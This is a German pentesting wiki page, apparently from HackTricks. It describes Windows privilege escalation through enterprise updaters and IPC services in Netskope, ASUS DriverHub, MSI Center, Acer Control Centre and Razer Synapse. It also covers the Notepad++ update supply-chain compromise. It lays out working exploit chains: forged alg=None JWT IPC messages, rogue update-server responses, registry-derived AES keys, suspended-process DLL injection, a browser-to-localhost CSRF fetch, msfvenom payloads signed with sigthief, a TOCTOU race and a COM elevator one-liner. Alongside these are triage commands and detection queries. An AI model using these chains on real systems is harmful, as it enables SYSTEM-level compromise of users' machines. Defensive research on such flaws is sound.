# Missbrauch von Enterprise Auto-Updaters und Privileged IPC (z.B. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Diese Seite verallgemeinert eine Klasse von Windows local privilege escalation-Chains, die in enterprise endpoint agents und updaters gefunden wurden, welche eine low-friction IPC surface und einen privileged update flow bereitstellen. Ein repräsentatives Beispiel ist Netskope Client für Windows < R129 (CVE-2025-0309), bei dem ein low-privileged user die Enrollment in einen attacker-controlled server erzwingen und dann ein malicious MSI liefern kann, das der SYSTEM service installiert.

Wichtige Ideen, die du gegen ähnliche Produkte wiederverwenden kannst:
- Missbrauche die localhost IPC eines privileged service, um eine erneute Enrollment oder Reconfiguration auf einen attacker server zu erzwingen.
- Implementiere die Update endpoints des Vendors, liefere eine rogue Trusted Root CA und verweise den updater auf ein malicious, „signed“ package.
- Umgehe schwache signer checks (CN allow-lists), optionale digest flags und lax MSI properties.
- Wenn IPC „encrypted“ ist, leite den key/IV aus world-readable machine identifiers ab, die in der registry gespeichert sind.
- Wenn der service Caller durch image path/process name einschränkt, injiziere in einen allow-listed process oder starte einen solchen suspended und bootstrappe deine DLL über einen minimalen thread-context patch.

---
## 1) Erzwingen der Enrollment auf einen attacker server via localhost IPC

Viele Agents liefern einen user-mode UI process mit, der über localhost TCP mittels JSON mit einem SYSTEM service spricht.

Beobachtet in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Erstelle ein JWT enrollment token, dessen claims den backend host steuern (z.B. AddonUrl). Verwende alg=None, damit keine Signatur erforderlich ist.
2) Sende die IPC message, die den provisioning command mit deinem JWT und tenant name aufruft:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Der Service beginnt, deinen Rogue-Server für enrollment/config anzusprechen, z. B.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Wenn die caller verification pfad-/namensbasiert ist, initiiere die Anfrage von einer allow-listed vendor binary (siehe §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Sobald der Client mit deinem Server spricht, implementiere die erwarteten Endpunkte und leite ihn zu einem attacker MSI. Typische Sequenz:

1) /v2/config/org/clientconfig → Gib JSON config mit einem sehr kurzen updater interval zurück, z. B.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Gibt ein PEM CA-Zertifikat zurück. Der Dienst installiert es in den Local Machine Trusted Root store.
3) /v2/checkupdate → Liefert Metadaten, die auf ein bösartiges MSI und eine gefälschte Version zeigen.

Umgehung gängiger Checks, wie sie in der Praxis vorkommen:
- Signer CN allow-list: Der Dienst prüft möglicherweise nur, ob der Subject CN „netSkope Inc“ oder „Netskope, Inc.“ entspricht. Deine Rogue CA kann ein Leaf mit diesem CN ausstellen und das MSI signieren.
- CERT_DIGEST property: Füge eine harmlose MSI-Eigenschaft namens CERT_DIGEST hinzu. Beim Installieren wird nichts erzwungen.
- Optional digest enforcement: Ein Config-Flag (z. B. check_msi_digest=false) deaktiviert zusätzliche kryptografische Validierung.

Ergebnis: Der SYSTEM-Dienst installiert dein MSI aus
C:\ProgramData\Netskope\stAgent\data\*.msi
und führt beliebigen Code als NT AUTHORITY\SYSTEM aus.

---
## 3) Forging encrypted IPC requests (when present)

Ab R127 verpackte Netskope IPC-JSON in einem encryptData-Feld, das wie Base64 aussieht. Beim Reverse Engineering zeigte sich AES mit Key/IV, die aus Registry-Werten abgeleitet werden, die für jeden User lesbar sind:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Angreifer können die Verschlüsselung nachbilden und gültige verschlüsselte Befehle als Standardbenutzer senden. Allgemeiner Tipp: Wenn ein Agent plötzlich sein IPC „verschlüsselt“, suche unter HKLM nach Device IDs, product GUIDs und install IDs als Material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Manche Dienste versuchen, den Peer zu authentifizieren, indem sie die PID der TCP-Verbindung auflösen und den Image-Pfad/-Namen mit allow-listed Vendor-Binaries unter Program Files vergleichen (z. B. stagentui.exe, bwansvc.exe, epdlp.exe).

Zwei praktische Umgehungen:
- DLL injection in einen allow-listed Prozess (z. B. nsdiag.exe) und das IPC von innen proxien.
- Einen allow-listed Binary suspended starten und deine Proxy-DLL ohne CreateRemoteThread bootstrappen (siehe §5), um driver-enforced tamper rules zu erfüllen.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Produkte liefern oft einen minifilter/OB callbacks driver (z. B. Stadrv) mit, der gefährliche Rechte von Handles zu geschützten Prozessen entfernt:
- Process: entfernt PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beschränkt auf THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ein zuverlässiger User-mode-Loader, der diese Einschränkungen respektiert:
1) Erstelle einen Prozess eines Vendor-Binaries mit CREATE_SUSPENDED.
2) Hole Handles, die weiterhin erlaubt sind: PROCESS_VM_WRITE | PROCESS_VM_OPERATION auf den Prozess und ein Thread-Handle mit THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (oder nur THREAD_RESUME, wenn du Code an einem bekannten RIP patchst).
3) Überschreibe ntdll!NtContinue (oder einen anderen frühen, sicher gemappten Thunk) mit einem kleinen Stub, der LoadLibraryW auf deinen DLL-Pfad aufruft und dann zurückspringt.
4) ResumeThread, um deinen Stub im Prozess auszulösen und deine DLL zu laden.

Da du nie PROCESS_CREATE_THREAD oder PROCESS_SUSPEND_RESUME auf einem bereits geschützten Prozess verwendet hast (du hast ihn selbst erstellt), ist die Policy des Drivers erfüllt.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatisiert eine Rogue CA, das Signieren eines bösartigen MSI und bedient die benötigten Endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope ist ein benutzerdefinierter IPC-Client, der beliebige (optional AES-verschlüsselte) IPC-Nachrichten erzeugt und die suspended-process injection enthält, um von einem allow-listed Binary zu stammen.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Wenn du einem neuen Endpoint-Agenten oder einer „helper“-Suite eines Mainboards gegenüberstehst, reicht meist ein schneller Workflow, um festzustellen, ob du ein vielversprechendes privesc-Ziel vor dir hast:

1) Loopback-Listener auflisten und den jeweiligen Vendor-Prozessen zuordnen:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Kandidaten für named pipes auflisten:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Registry-gestützte Routing-Daten auslesen, die von plugin-basierten IPC-Servern verwendet werden:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extrahiere zunächst die Endpunktnamen, JSON-Keys und Command-IDs aus dem User-Mode-Client. Gepackte Electron/.NET-Frontends leaken häufig das vollständige Schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Suche nach dem eigentlichen Trust Predicate, nicht nur nach dem Code-Pfad, der letztendlich den Prozess startet:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Muster, die sich zu priorisieren lohnen:
- `CryptQueryObject`/certificate parsing ohne `WinVerifyTrust` bedeutet meist, dass „certificate exists“ als „certificate is trusted“ behandelt wurde, was certificate cloning oder andere fake-signer tricks ermöglicht.
- Substring-/Suffix-Prüfungen über `Origin`, `Referer`, download URLs, process names oder signer CNs sind keine authentication. `contains(".vendor.com")` ist meist mit angreifergesteuerten lookalike domains ausnutzbar.
- Wenn die Low-privileged GUI entscheidet „the file is trusted“ und der SYSTEM broker nur dieses Ergebnis konsumiert, umgeht das Patchen oder Reimplementieren der client-side DLL/JS oft die boundary komplett (Razer-style split validation).
- Wenn der broker eine payload nach `%TEMP%`/`C:\Windows\Temp` kopiert und sie dann von diesem Pfad aus validiert oder plant, teste sofort auf TOCTOU replacement windows und auf sibling plugin modules, die alternative `ExecuteTask()` wrappers mit schwächeren checks bereitstellen.

Bei targets mit vielen named pipes ist PipeViewer eine schnelle Möglichkeit, weak DACLs und remote erreichbare pipes zu erkennen, bevor du mit dem Reverse Engineering des Protokolls im Detail beginnst.

Wenn der target callers nur über PID, image path oder process name authentifiziert, behandle das eher als speed bump denn als boundary: Injecting in den legitimen client oder die Verbindung von einem allow-listed process aus herzustellen, reicht oft aus, um die checks des servers zu erfüllen. Für named pipes speziell behandelt [diese Seite über client impersonation und pipe abuse](named-pipe-client-impersonation.md) das primitive ausführlicher.

---
## 1) Browser-to-localhost CSRF gegen privileged HTTP APIs (ASUS DriverHub)

DriverHub liefert einen user-mode HTTP service (ADU.exe) auf 127.0.0.1:53000 aus, der browser calls erwartet, die von https://driverhub.asus.com kommen. Der origin filter führt einfach `string_contains(".asus.com")` über den Origin-Header und über download URLs aus, die von `/asus/v1.0/*` exponiert werden. Jeder angreifergesteuerte Host wie `https://driverhub.asus.com.attacker.tld` passiert daher die Prüfung und kann state-changing requests aus JavaScript senden. Siehe [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) für zusätzliche bypass patterns.

Praktischer Ablauf:
1) Registriere eine Domain, die `.asus.com` einbettet, und hoste dort eine malicious webpage.
2) Nutze `fetch` oder XHR, um einen privileged endpoint (z. B. `Reboot`, `UpdateApp`) auf `http://127.0.0.1:53000` aufzurufen.
3) Sende den JSON body, den der handler erwartet – das gepackte frontend JS zeigt das Schema unten.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Selbst die unten gezeigte PowerShell-CLI ist erfolgreich, wenn der Origin-Header auf den vertrauenswürdigen Wert gespooft wird:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Jeder Browserbesuch der Angreiferseite wird damit zu einem 1-Click- (oder 0-Click über `onload`) lokalen CSRF, der einen SYSTEM-Helper antreibt.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` lädt beliebige Executables herunter, die im JSON-Body definiert sind, und cached sie in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Die Validierung der Download-URL verwendet dieselbe Substring-Logik, daher wird `http://updates.asus.com.attacker.tld:8000/payload.exe` akzeptiert. Nach dem Download prüft ADU.exe nur, ob die PE eine Signatur enthält und ob der Subject-String vor dem Ausführen ASUS entspricht – kein `WinVerifyTrust`, keine Chain-Validierung.

Um den Flow zu weaponizen:
1) Erstelle ein Payload (z. B. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Klone den ASUS-Signer hinein (z. B. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hoste `pwn.exe` auf einer `.asus.com`-Lookalike-Domain und trigger UpdateApp über den Browser-CSRF oben.

Da sowohl die Origin- als auch die URL-Filter auf Substrings basieren und der Signer-Check nur Strings vergleicht, holt DriverHub die Angreifer-Binary und führt sie unter seinem erhöhten Kontext aus.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

Der SYSTEM-Service von MSI Center stellt ein TCP-Protokoll bereit, bei dem jedes Frame `4-byte ComponentID || 8-byte CommandID || ASCII arguments` ist. Die Kernkomponente (Component ID `0f 27 00 00`) liefert `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Ihr Handler:
1) Kopiert das angegebene Executable nach `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifiziert die Signatur über `CS_CommonAPI.EX_CA::Verify` (Certificate Subject muss `MICRO-STAR INTERNATIONAL, CO., LTD.` entsprechen und `WinVerifyTrust` muss erfolgreich sein).
3) Erstellt eine Scheduled Task, die die Temp-Datei als SYSTEM mit vom Angreifer kontrollierten Argumenten ausführt.

Die kopierte Datei wird zwischen Verifikation und `ExecuteTask()` nicht gelockt. Ein Angreifer kann:
- Frame A an eine legitime, von MSI signierte Binary senden (garantiert, dass der Signatur-Check besteht und die Task eingereiht wird).
- Das mit wiederholten Frame-B-Messages rennen, die auf ein bösartiges Payload zeigen und `MSI Center SDK.exe` direkt nach Abschluss der Verifikation überschreiben.

Wenn der Scheduler auslöst, führt er das überschriebenes Payload unter SYSTEM aus, obwohl die ursprüngliche Datei validiert wurde. Zuverlässige Ausnutzung verwendet zwei Goroutines/Threads, die CMD_AutoUpdateSDK spammen, bis das TOCTOU-Fenster gewonnen ist.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Jedes Plugin/DLL, das von `MSI.CentralServer.exe` geladen wird, erhält eine Component ID, die unter `HKLM\SOFTWARE\MSI\MSI_CentralServer` gespeichert ist. Die ersten 4 Bytes eines Frames wählen diese Komponente aus, wodurch Angreifer Commands an beliebige Module routen können.
- Plugins können ihre eigenen Task Runner definieren. `Support\API_Support.dll` exponiert `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` und ruft direkt `API_Support.EX_Task::ExecuteTask()` mit **keiner** Signaturvalidierung auf – jeder lokale User kann es auf `C:\Users\<user>\Desktop\payload.exe` zeigen lassen und deterministisch SYSTEM-Ausführung erhalten.
- Das Sniffen von Loopback mit Wireshark oder das Instrumentieren der .NET-Binaries in dnSpy zeigt schnell das Component-↔Command-Mapping; benutzerdefinierte Go-/Python-Clients können dann Frames wiedergeben.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exponiert `\\.\pipe\treadstone_service_LightMode`, und seine discretionary ACL erlaubt Remote-Clients (z. B. `\\TARGET\pipe\treadstone_service_LightMode`). Das Senden von Command ID `7` mit einem Dateipfad ruft die Prozess-Spawn-Routine des Dienstes auf.
- Die Client-Library serialisiert ein magisches Terminator-Byte (113) zusammen mit Args. Dynamische Instrumentierung mit Frida/`TsDotNetLib` (siehe [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) für Instrumentierungs-Tipps) zeigt, dass der native Handler diesen Wert auf ein `SECURITY_IMPERSONATION_LEVEL` und eine Integrity-SID abbildet, bevor `CreateProcessAsUser` aufgerufen wird.
- Das Ersetzen von 113 (`0x71`) durch 114 (`0x72`) fällt in den generischen Branch zurück, der das volle SYSTEM-Token behält und eine High-Integrity-SID setzt (`S-1-16-12288`). Die gestartete Binary läuft daher als unrestricted SYSTEM, sowohl lokal als auch maschinenübergreifend.
- Kombiniere das mit dem exponierten Installer-Flag (`Setup.exe -nocheck`), um ACC auch auf Lab-VMs bereitzustellen und die Pipe ohne Vendor-Hardware zu testen.

Diese IPC-Bugs zeigen, warum localhost-Services Mutual Authentication erzwingen müssen (ALPC SIDs, `ImpersonationLevel=Impersonation`-Filter, Token-Filtering) und warum jeder „run arbitrary binary“-Helper eines Moduls dieselben Signaturprüfungen teilen muss.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 fügte dieser Familie ein weiteres nützliches Muster hinzu: Ein Low-Privileged-User kann einen COM-Helper bitten, einen Prozess über `RzUtility.Elevator` zu starten, während die Trust-Entscheidung an eine User-Mode-DLL (`simple_service.dll`) delegiert wird, statt robust innerhalb der privilegierten Grenze erzwungen zu werden.

Beobachteter Exploitation-Pfad:
- Instanziiere das COM-Objekt `RzUtility.Elevator`.
- Rufe `LaunchProcessNoWait(<path>, "", 1)` auf, um einen erhöhten Start anzufordern.
- Im öffentlichen PoC wird das PE-Signature-Gate in `simple_service.dll` vor dem Absenden der Anfrage gepatcht, wodurch ein beliebiges, vom Angreifer gewähltes Executable gestartet werden kann.

Minimale PowerShell-Ausführung:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Allgemeine Kernaussage: Beim Reverse Engineering von „helper“-Suites solltest du nicht bei localhost TCP oder named pipes aufhören. Prüfe COM-Klassen mit Namen wie `Elevator`, `Launcher`, `Updater` oder `Utility`, und verifiziere dann, ob der privilegierte Service die Ziel-Binary wirklich validiert oder nur ein von einer patchbaren User-Mode-Client-DLL berechnetes Ergebnis vertraut. Dieses Muster geht über Razer hinaus: Jedes Split-Design, bei dem der High-Privilege-Broker eine Allow/Deny-Entscheidung von der Low-Privilege-Seite übernimmt, ist eine mögliche privesc-Oberfläche.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Zwischen Juni 2025 und Dezember 2025 servierten Angreifer, die die Hosting-Infrastruktur hinter dem Notepad++-Update-Flow kompromittiert hatten, ausgewählten Opfern gezielt bösartige Manifeste. Ältere WinGUp-basierte Updater prüften die Update-Authentizität nicht vollständig, sodass eine feindliche XML-Antwort Clients auf attacker-kontrollierte URLs umleiten konnte. Weil der Client HTTPS-Inhalte akzeptierte, ohne sowohl eine vertrauenswürdige Zertifikatskette als auch eine gültige PE-Signatur für den heruntergeladenen Installer zu erzwingen, luden Opfer ein trojanisiertes NSIS-`update.exe` herunter und führten es aus.

Operativer Ablauf (kein lokaler Exploit erforderlich):
1. **Infrastructure interception**: CDN/Hosting kompromittieren und Update-Checks mit attacker-Metadaten beantworten, die auf eine bösartige Download-URL verweisen.
2. **Trojanized NSIS**: Der Installer lädt/executiert eine Payload und missbraucht zwei Execution-Chains:
- **Bring-your-own signed binary + sideload**: das signierte Bitdefender `BluetoothService.exe` bündeln und eine bösartige `log.dll` in dessen Suchpfad ablegen. Wenn die signierte Binary läuft, sideloadet Windows `log.dll`, die die Chrysalis-Backdoor entschlüsselt und reflectively lädt (Warbird-protected + API hashing, um statische Erkennung zu erschweren).
- **Scripted shellcode injection**: NSIS führt ein kompiliertes Lua-Skript aus, das Win32-APIs (z. B. `EnumWindowStationsW`) verwendet, um Shellcode zu injizieren und Cobalt Strike Beacon zu stagen.

Hardening/Detection-Kernaussagen für jeden auto-updater:
- Erzwinge **certificate + signature verification** des heruntergeladenen Installers (Vendor-Signer pinnen, abweichende CN/Chain ablehnen) und signiere das Update-Manifest selbst (z. B. XMLDSig). Blockiere durch das Manifest gesteuerte Redirects, solange sie nicht validiert sind.
- Behandle **BYO signed binary sideloading** als Post-Download-Detection-Pivot: Alarmieren, wenn eine signierte Vendor-EXE eine DLL mit Namen außerhalb ihres kanonischen Installationspfads lädt (z. B. Bitdefender lädt `log.dll` aus Temp/Downloads) und wenn ein Updater Installer aus temp ablegt/ausführt, die keine Vendor-Signaturen tragen.
- Überwache **malware-specific artifacts**, die in dieser Chain beobachtet wurden (nützlich als generische Pivots): Mutex `Global\Jdhfv_1.0.1`, anomale `gup.exe`-Writes nach `%TEMP%`, und Lua-gesteuerte Shellcode-Injection-Stages.
- Notepad++ reagierte, indem es WinGUp in v8.8.9 und späteren Versionen härter absicherte: Das zurückgegebene XML ist jetzt signiert (XMLDSig), und neuere Builds erzwingen Zertifikats- + Signaturprüfung des heruntergeladenen Installers, statt allein dem Transport zu vertrauen.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> startet einen Nicht-Notepad++-Installer</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Diese Muster lassen sich auf jeden Updater verallgemeinern, der unsignierte Manifeste akzeptiert oder die Signer des Installers nicht fest pinnt—network hijack + malicious installer + BYO-signed sideloading führt zu remote code execution unter dem Deckmantel von „trusted“ updates.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
